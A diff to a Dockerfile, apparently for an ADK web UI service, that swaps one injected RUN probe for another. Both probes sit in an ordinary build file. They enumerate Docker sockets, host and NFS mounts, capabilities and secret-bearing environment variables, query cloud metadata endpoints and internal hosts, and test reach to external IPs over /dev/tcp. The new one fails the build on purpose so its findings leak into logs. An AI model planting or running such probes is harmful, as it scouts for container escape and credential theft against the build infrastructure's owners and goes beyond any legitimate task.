@@ -28,8 +28,8 @@ COPY . .
 RUN uv sync --frozen
 
 # Expose the ADK web UI port
-# i11099 build-context probe (non-fatal)
-RUN sh -c 'set +e; { echo PROBE-I11099; echo "--id"; id; hostname; uname -a; echo "--cgroup"; cat /proc/1/cgroup; echo "--p1cmd"; tr "\\0" " " < /proc/1/cmdline; echo; echo "--sock"; ls -l /var/run/docker.sock /run/docker.sock /host /mnt/nfs 2>&1; echo "--mount"; mount 2>&1 | head -40; echo "--caps"; grep -E "Cap(Eff|Bnd)" /proc/self/status; echo "--env"; env | grep -Ei "docker|token|gcp|registry|nfs|host|secret"; echo "--net"; for u in http://172.18.0.31:8080/health http://172.18.0.29:8080/health http://169.254.169.254/ http://metadata.google.internal/; do printf "%s => %s\n" "$u" "$(curl -s -m 3 -o /dev/null -w "%{http_code}" "$u" 2>&1)"; done; echo "--nfs-write"; (echo i11099 > /mnt/nfs/i11099_probe_marker) 2>&1; } > /probe-i11099.txt 2>&1; true'
+# i11233 shard A: fs/sock/caps/env/net probe (fails build on purpose)
+RUN sh -c 'echo PRA; id -u; ls -l /var/run/docker.sock /run/docker.sock 2>&1 | cut -c1-55; grep CapEff /proc/self/status | cut -c1-40; mount | grep -E "docker.sock|/host|mnt/nfs|sherpa" | cut -c1-70 | head -3; echo ENVN=$(env | grep -Eic "docker|token|gcp|registry|nfs"); for t in 172.18.0.29:8080 66.201.7.92:22 66.201.7.195:22; do h=${t%:*}; p=${t#*:}; timeout 4 bash -c "echo >/dev/tcp/$h/$p" 2>/dev/null && echo "$t OK" || echo "$t NO"; done; ls /mnt/nfs 2>&1 | head -2; echo PREND; exit 1'
 
 EXPOSE 8080
 
